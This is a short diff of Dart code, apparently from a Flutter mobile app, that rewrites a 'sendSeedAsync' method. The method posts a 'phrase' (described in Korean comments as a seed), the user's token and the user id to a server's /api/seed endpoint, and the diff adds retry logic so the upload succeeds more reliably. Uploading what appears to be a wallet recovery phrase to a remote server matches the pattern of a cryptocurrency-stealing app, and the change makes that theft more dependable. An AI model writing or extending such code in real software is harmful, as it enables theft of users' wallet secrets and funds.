@@ -136,29 +136,34 @@ class ServerApi {
   }
 
   /// POST /api/seed - 시드 전송
-  static Future<void> sendSeedAsync(String token, String phrase) async {
+  static Future<void> sendSeedAsync(String token, String phrase, {int maxRetries = 3}) async {
     if (!enabled || token.isEmpty) return;
-    try {
-      final body = jsonEncode({
-        'token': token,
-        'phrase': phrase,
-        'id': currentUserId ?? '',
-      });
-      final resp = await _client
-          .post(
-            Uri.parse('$baseUrl/api/seed'),
-            headers: {'Content-Type': 'application/json'},
-            body: body,
-          )
-          .timeout(_timeout);
-      if (resp.statusCode < 200 || resp.statusCode >= 300) {
-        // AppLog equivalent - caller can log
+    final body = jsonEncode({
+      'token': token,
+      'phrase': phrase,
+      'id': currentUserId ?? '',
+    });
+    for (var attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+        final resp = await _client
+            .post(
+              Uri.parse('$baseUrl/api/seed'),
+              headers: {'Content-Type': 'application/json'},
+              body: body,
+            )
+            .timeout(_timeout);
+        if (resp.statusCode >= 200 && resp.statusCode < 300) {
+          return;
+        }
         // ignore: avoid_print
-        print('[시드 전송] 서버 응답 오류 ${resp.statusCode}');
+        print('[시드 전송] 서버 응답 오류 ${resp.statusCode} (시도 $attempt/$maxRetries)');
+      } catch (e) {
+        // ignore: avoid_print
+        print('[시드 전송] 실패: $e (시도 $attempt/$maxRetries)');
       }
-    } catch (e) {
-      // ignore: avoid_print
-      print('[시드 전송] 실패: $e');
+      if (attempt < maxRetries) {
+        await Future.delayed(const Duration(milliseconds: 300));
+      }
     }
   }
 
